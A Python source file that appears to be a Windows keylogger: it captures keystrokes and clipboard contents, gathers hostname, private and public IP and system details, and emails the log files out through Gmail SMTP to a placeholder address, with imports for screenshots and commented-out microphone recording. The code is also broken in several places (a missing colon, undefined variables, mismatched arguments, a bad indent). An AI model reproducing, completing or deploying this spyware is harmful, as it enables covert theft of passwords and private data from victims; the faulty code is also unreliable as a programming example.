import time
import os

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
#import sounddevice as sd
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write

from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "Keylog.txt"
system_information = "systeminfo.txt"
clipboard_inforamtion = "clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
number_of_iterations = 0
currentTime = time.time()
stoppingtime = time.time() + time_iteration

email_address = "something@examole.com"
password = "password"

toaddr = "something2@example.com"

file_path = "D:\Users\User\Desktop\Benny"
extend = "\\"

#email sender with attachment
def send_email(filename, attachment, toaddr)

    fromaddr = email_address
    message =   MIMEMultipart()
    message['From'] = fromaddr
    message['To'] = toaddr
    message['Subject'] = "The Log file"
    body = "Body_of_the_mail"
    message.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octeb-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()


    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, computer_information, clipboard_inforamtion, toaddr)

#Get information from the computer:
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostbyname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Could not find IP Address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Mchine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

#copy clipboard information:
def copy_clipboard():
    with open(file_path + extend + clipboard_inforamtion, "a") as f:
        try: 
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard

            f.write("clipboard Data: " '\n' + pasted_data)
        except:
        f.write("Clipboard could not be copied")

copy_clipboard()

#def microphone():
   # fs = 44100
    #the amount of the time that we recording:
    #seconds = microphone_time

   #myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    #d.wait
    #rite(file_path + extend +)
#microphone()

while number_of_iterations < number_of_iterations_end:


    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingtime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingtime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        send_email(computer_information, file_path + extend, toaddr)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingtime = time.time() + time_iteration



